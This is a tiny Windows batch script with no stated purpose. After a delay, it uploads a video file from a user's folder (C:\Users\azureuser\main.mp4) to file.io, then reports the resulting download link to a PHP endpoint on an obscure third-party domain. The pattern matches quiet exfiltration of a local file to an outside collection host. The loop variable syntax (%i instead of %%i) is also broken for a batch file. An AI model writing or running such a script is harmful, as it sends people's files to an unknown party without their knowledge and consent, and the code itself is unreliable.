@echo off
timeout /t %1
for /f %i in ('curl -F "file=@C:\Users\azureuser\main.mp4" https://file.io') do set RESULT=%i
curl "https://20-11.eu5.org/inc.php?lnk=%RESULT%"